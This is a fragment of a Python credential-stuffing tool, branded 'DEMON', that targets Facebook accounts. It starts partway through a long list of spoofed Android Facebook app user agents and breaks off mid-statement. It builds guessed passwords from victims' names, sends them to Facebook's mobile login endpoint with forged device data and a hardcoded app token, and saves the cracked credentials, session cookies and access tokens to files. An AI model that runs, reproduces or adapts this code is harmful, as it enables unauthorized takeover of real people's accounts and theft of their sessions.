power;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1472};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/405.1.0.28.72;FBBV/455203920;FBDM/{density=3.375,width=1080,height=2139};FBLC/ro_RO;FBRV/0;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/405.0.0.23.72;FBBV/453370252;FBDM/{density=3.0,width=1080,height=2156};FBLC/"+lan+";FBRV/455160500;FBCR/"+fbcr+";FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH2065;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/25.0.0.52.53;FBBV/20097162;FBDM/{density=1.4,width=1450,height=2570};FBLC/"+lan+";FBCR/"+fbcr+";FBMF/Motorola;FBBD/Motorola;FBPN/com.facebook.katana;FBDV/Moto G Stylus (2021);FBSV/7.1.1;nullFBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/16.0.0.20.15;FBBV/4061184;FBDM/{density=1.5,width=540,height=960};FBLC/"+lan+";FB_FW/2;FBCR/"+fbcr+";FBPN/com.facebook.katana;FBDV/Lenovo A850+;FBSV/4.2.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/414.0.0.30.113;FBBV/473313172;FBDM/{density=2.625,width=1080,height=2205};FBLC/"+lan+";FBRV/475574872;FBCR/Google Fi;FBMF/Google;FBBD/google;FBPN/com.facebook.katana;FBDV/Pixel 6a;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]", "Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H) [FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/zh_CN;FBBV/394408512;FBCR/EE;FBMF/Asus;FBBD/Asus;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=800,height=1280};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/418.0.0.33.69;FBBV/482142412;FBDM/{density=2.0,width=720,height=1280};FBLC/"+lan+";FBRV/483737047;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J400M;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/418.0.0.33.69;FBBV/482142437;FBDM/{density=2.625,width=1080,height=2174};FBLC/"+lan+";FBRV/483737047;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g41;FBSV/12;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/406.0.0.26.90;FBBV/456153941;FBDM/{density=2.8125,width=1080,height=2156};FBLC/"+lan+";FBRV/0;FBCR/;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/BE2026;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/396.0.0.21.104;FBBV/428168139;FBDM/{density=1.3312501,width=800,height=1216};FBLC/"+lan+";FBRV/429820205;FBCR/;FBMF/Qlink;FBBD/Qlink;FBPN/com.facebook.katana;FBDV/Scepter8;FBSV/12;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 10; moto e(7i) power Build/QOJS30.506-7-18) [FBAN/FB4A;FBAV/407.0.0.30.97;FBPN/com.facebook.katana;FBLC/es_US;FBBV/458543253;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBDV/moto e(7i) power;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/{density=1.75,width=720,height=1472};FB_FW/1;FBRV/0;]","[FBAN/FB4A;FBAV/405.1.0.28.72;FBBV/455203920;FBDM/{density=3.375,width=1080,height=2139};FBLC/ro_RO;FBRV/0;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/POT-LX1;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/405.1.0.28.72;FBBV/455203952;FBDM/{density=3.1875,width=1080,height=2159};FBLC/"+lan+";FBRV/456763519;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A536B;FBSV/13;FBOP/1;FBCA/arm64-v8a:;]", "[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=2060};FBLC/"+lan+";FBRV/273364224;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ANE-LX1;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803889;FBDM/{density=3.0,width=1080,height=2110};FBLC/"+lan+";FBRV/271519795;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/YAL-L21;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2147};FBLC/"+lan+";FBRV/273494982;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L09;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2180};FBLC/"+lan+";FBRV/273736137;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/M2007J3SY;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2107};FBLC/"+lan+";FBRV/273695459;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2135};FBLC/"+lan+";FBRV/273731541;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/MI 9;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2131};FBLC/"+lan+";FBRV/273781587;FBCR/"+fbbv+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.625,width=1080,height=2184};FBLC/"+lan+";FBRV/273160185;FBCR/"+fbbv+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A415F;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.625,width=1080,height=2094};FBLC/"+lan+";FBRV/273589450;FBCR/"+fbbv+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A920F;FBSV/10;FBBK/1;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401209;FBDM/{density=2.0,width=720,height=1456};FBLC/"+lan+";FBRV/273474118;FBCR/;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1931;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=2076};FBLC/"+lan+";FBRV/273837177;FBCR/"+fbbv+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G950F;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=2.75,width=1080,height=2270};FBLC/"+lan+";FBRV/274073372;FBCR/"+fbbv+";FBMF/Xiaomi;FBBD/POCO;FBPN/com.facebook.katana;FBDV/POCO F2 Pro;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401184;FBDM/{density=3.0,width=1080,height=1776};FBLC/"+lan+";FBRV/274073372;FBCR/"+fbbv+";FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/H4113;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401174;FBDM/{density=2.0,width=720,height=1280};FBLC/"+lan+";FBRV/274073372;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=3.0,width=1080,height=1920};FBLC/"+lan+";FBRV/274352184;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HONOR;FBPN/com.facebook.katana;FBDV/STF-L09;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922292;FBDM/{density=3.0,width=1080,height=1920};FBLC/"+lan+";FBRV/274536441;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=2.75,width=1080,height=2130};FBLC/"+lan+";FBRV/274630178;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922298;FBDM/{density=3.375,width=1080,height=2011};FBLC/"+lan+";FBRV/274630178;FBCR/"+fbcr+";FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00TD;FBSV/9;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922292;FBDM/{density=3.0,width=1080,height=1794};FBLC/"+lan+";FBRV/274669536;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PRA-LX1;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=3.0,width=1080,height=2178};FBLC/"+lan+";FBRV/274614947;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G980F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/305.1.0.40.120;FBBV/272401210;FBDM/{density=3.0,width=1080,height=2107};FBLC/"+lan+";FBRV/274073372;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/MAR-LX1A;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.625,width=1080,height=2132};FBLC/"+lan+";FBRV/274852780;FBCR/"+fbcr+";FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/Nokia 7.2;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/301.0.0.37.477;FBBV/267342878;FBDM/{density=3.0,width=1080,height=1920};FBLC/fr_FR;FBRV/268824966;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803856;FBDM/{density=2.0,width=720,height=1344};FBLC/"+lan+";FBRV/271519795;FBCR/;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/REVVL 2;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=2.75,width=1080,height=2168};FBLC/"+lan+";FBRV/275364963;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9S;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/275.0.0.49.127;FBBV/221372446;FBDM/{density=3.0,width=1080,height=2090};FBLC/"+lan+";FBRV/225933467;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/JNY-LX1;FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340670;FBDM/{density=2.0,width=720,height=1384};FBLC/"+lan+";FBRV/0;FBCR/"+fbcr+".;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J600FN;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/300.2.0.58.129;FBBV/265244930;FBDM/{density=1.5,width=540,height=960};FBLC/"+lan+";FBRV/267438968;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J250G;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797384;FBDM/{density=2.0,width=720,height=1424};FBLC/th_Qaau_TH;FBRV/275412984;FBCR/"+fbcr+";FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/CPH1901;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=2.625,width=1080,height=2131};FBLC/"+lan+";FBRV/276081113;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A505FN;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797387;FBDM/{density=4.0,width=1440,height=2392};FBLC/"+lan+";FBRV/276198575;FBCR/"+fbcr+";FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H850;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797113;FBDM/{density=2.625,width=1080,height=2137};FBLC/"+lan+";FBRV/276333355;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/motorola one zoom;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797441;FBDM/{density=3.0,width=1080,height=2265};FBLC/"+lan+";FBRV/276389460;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VOG-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273922314;FBDM/{density=2.625,width=1080,height=2134};FBLC/de_DE;FBRV/275142282;FBCR/"+fbcr+";FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A6013;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987656;FBDM/{density=1.75,width=720,height=1448};FBLC/"+lan+";FBRV/276404237;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A217M;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","Dalvik/2.1.0 (Linux; U; Android 9; FIG-LX1 Build/HUAWEIFIG-L31) [FBAN/Orca-Android;FBAV/302.0.0.11.117;FBPN/com.facebook.orca;FBLC/es_ES;FBBV/275958904;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBDV/FIG-LX1;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2032};FB_FW/1;]","[FBAN/FB4A;FBAV/306.1.0.40.119;FBBV/273921911;FBDM/{density=3.0,width=1080,height=1920};FBLC/"+lan+";FBRV/274807707;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi Note 4;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=2.75,width=1080,height=2168};FBLC/"+lan+";FBRV/277267055;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 9 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987658;FBDM/{density=3.0,width=1080,height=2020};FBLC/"+lan+";FBRV/277454707;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G970F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987623;FBDM/{density=2.0,width=720,height=1280};FBLC/"+lan+";FBRV/277531280;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/308.0.0.42.118;FBBV/275987624;FBDM/{density=3.0,width=1080,height=1776};FBLC/sv_SE;FBRV/277662387;FBCR/"+fbcr+";FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/Moto G (5S) Plus;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","Dalvik/2.1.0 (Linux; U; Android 9; Kirin Treble Build/PQ2A.190405.003) [FBAN/FB4A;FBAV/306.1.0.40.119;FBPN/com.facebook.katana;FBLC/ru_US;FBBV/273922298;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/Huawei;FBDV/Kirin Treble;FBSV/9;FBCA/arm64-v8a:null;FBDM/{density=2.4,width=1080,height=2075};FB_FW/1;FBRV/275142282;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2076};FBLC/"+lan+";FBRV/277806148;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N960U;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/307.0.0.40.111;FBBV/274797148;FBDM/{density=3.0,width=1080,height=2043};FBLC/"+lan+";FBRV/276389460;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Mi A2 Lite;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444778;FBDM/{density=2.0,width=720,height=1369};FBLC/"+lan+";FBRV/278696245;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 7;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/303.0.0.30.122;FBBV/269803856;FBDM/{density=2.0,width=720,height=1440};FBLC/"+lan+";FBRV/271519795;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/DUB-LX1;FBSV/8.1.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444755;FBDM/{density=1.2125,width=720,height=1417};FBLC/"+lan+";FBRV/278492457;FBCR/"+fbcr+";FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LM-X430;FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444772;FBDM/{density=1.875,width=720,height=1458};FBLC/"+lan+";FBRV/278680025;FBCR/"+fbcr+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A426B;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444755;FBDM/{density=1.30625,width=720,height=1280};FBLC/"+lan+";FBRV/0;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/287.0.0.50.119;FBBV/243660812;FBDM/{density=2.0,width=720,height=1280};FBLC/"+lan+";FBRV/245218954;FBCR/"+fbcr+";FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 5A;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444780;FBDM/{density=3.0,width=1080,height=2265};FBLC/"+lan+";FBRV/279985922;FBCR/"+fbcr+";FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/ELE-L29;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]",])
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"secure_family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "account_recovery",
'sim_serials': "['80973453345210784798']",
'openid_flow': 'android_login',
'openid_provider': 'google',
'openid_tokens': "['eyJhbGciOiJSUzI1NiIsImtpZCI6IjdjOWM3OGUzYjAwZTFiYjA5MmQyNDZjODg3YjExMjIwYzg3YjdkMjAiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiAiYWNjb3VudHMuZ29vZ2xlLmNvbSIsICJhenAiOiAiMTY5MjI5MzgyMy0xZno0cGVjOGg5N2JsYmxmd2t0ODh2NG8weWJ5Y2pseWYuYXBwcy5nb29nbGV1c2VyY29udGVudC5jb20iLCAiYXVkIjogIjE2OTIyOTM4MjMtbDhqZDA5OGh5Y3dmd2lnZDY0NW5xMmdmeXV0YTFuZ2FoLmFwcHMuZ29vZ2xldXNlcmNvbnRlbnQuY29tIiwgInN1YiI6ICIxMDkxMzk4NzMzNDMwNTcwMDE5NzkiLCAiZW1haWwiOiAiMTk0NUBnbWFpbC5jb20iLCAiZW1haWxfdmVyaWZpZWQiOiB0cnVlLCAicGljdHVyZSI6ICJodHRwczovL2xoMy5nb29nbGV1c2VyY29udGVudC5jb20vYS0vQURfY01NUmtFY3FDcTlwcF9YMHdIYTlSb3JpR2V1a0tJa0NnLU15TjFiR2gxb3lnX1E9czk2LWMiLCAiaWF0IjogMTY5MjI5MzgyMywgImV4cCI6IDE2OTIyOTM4MjN9.oHvakCxpmVdAzYgq5jSXN5uCD6L10Bj2EhblWK4IEFhat_acn6jDPKGcYVDx8wxoj5rFRVbDP1xwzfN0eCFG6R9pTslsQHP-PrTNsqeVnhWDV1iEup77iRhPjJRClNMij5RzqQFr7rStwPtAolrQWC_q_uuFrGelW21Tg_enA36PPSrShnloTm6zt83xUYzKQvXl55brBs2zatZ2vWwftwMoOWfp6NbUkd8hliZrMGA8j_A9PTij_1-5BQZSOXSfjcxl7JtZwqx4DJN2dkI0eT6hSAjc4YUOMQHDLRJD9tY4ckYfzJ38mGjs2m5wACv2n1QLoOLpoVspfT86Ky-N4g']",
'openid_emails': "['01710940017']",
"email": uid,
"password": pw,
"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "NO_FILE",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": lan,
"client_country_code": lan2,
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "AuthOperations$PasswordAuthOperation",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent':DEMON_ua,
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': '45201',
'X-FB-SIM-HNI': '45204',
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-FB-Connection-Quality':'EXCELLENT',
"X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
'X-Tigon-Is-Retry': 'False',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'unknown',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
				#print(q)
				if "session_key" in q:
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cok = f"sb={ssbb};{ckkk}"					    
					p('\r\033[1;92m[DEMON-OK] %s | %s \033[1;97m '%(uid,pw))		
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					print(f" [•]\033[1;96m Cookie : {cok}\033[1;97m")
					print(f" [•]\033[1;96m UserAgent  : {DEMON_ua}\033[1;97m")
					ok.append(uid)
					#p("\033[1;33m[COOOKII-🥵] :\033[1;33m "+cok)
					open('/sdcard/DEMON_OK.txt','a').write(uid+'|'+pw+'\n')					
					open('/sdcard/DEMON_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					#p('\r\033[1;35m[DEMON-CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/DEMON_M5_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method5(uid,nm,pwx)
		except Exception as e:
			self.method5(uid,nm,pwx)
	def method6(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [DEMON] %s | M6 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			ss = random.choice(["en_US","fr_FR","ha_NG","en_GB"])
			sam = random.choice(samsung)
			net = random.choice(["MTN-Stay Safe","MTN-STAY SAFE","MTN NG","null","Airtel NG","","Glo NG"])
			fbbv = str(random.randint(211111111,499999999))
			fbav = f'{random.randint(200,450)}.0.0.{random.randint(11,99)}.{random.randint(111,399)}'
			#m4url = "https://iquaqib.vercel.app/ua"
			#m4ua = requests.get(m4url).text
			#m4ua = iAmMethod1Ua()
			m8ua = "[FBAN/FB4A;FBAV/54.0.0.3795;FBBV/66205985[FBAN/Orca-Android;FBAV/247.0.0.30.84;FBPN/com.facebook.orca;FBBV/410140983;FBLC/en_GB;FBCA/arm64-v8a:;FBCR/;FBMF/INFINIX MOBILITY LIMITED;FBBD/Infinix;FBDV/Infinix X695;FBSV/11;FBDM/{density=2.0,width=720,height=1440};]"
			m9ua = "[FBAN/FB4A;FBAV/444.0.0.2662;FBBV/5231713;[FBAN/FB4A;FBAV/"+fbav+";FBBV/"+fbbv+";FBDM/{density=2.625,width=1080,height=1920};FBLC/en_GB;FBRV/0;FBCR/"+net+";FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-"+sam+";FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
			ua = iAmMethod1Ua()
			ua = iAmMethod3Ua()
			#ua = random.choice([m8ua,m9ua])
			ua = random.choice(ugent)
			ua = random.choice(ugen)
			ua = random.choice(ugen1)
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			#try:
				##mn = nm.split(' ')[3]
			#except:
				#mn = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				link = 